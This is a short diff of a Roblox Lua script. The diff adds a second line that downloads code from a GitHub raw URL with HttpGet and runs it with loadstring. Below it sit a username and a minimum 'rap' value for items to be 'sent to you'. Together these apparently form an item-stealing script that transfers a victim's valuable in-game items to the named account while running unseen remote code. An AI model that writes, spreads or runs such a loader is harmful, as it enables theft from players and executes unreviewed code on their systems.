@@ -1,4 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BearrXW/test/refs/heads/main/mainnewfile"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BearrXW/test/refs/heads/main/newfile2"))()
 
 Username = "bx4rzwasdeleted"
 min_rap = 10 -- minimum rap of each item you want to get sent to you. 10k by default
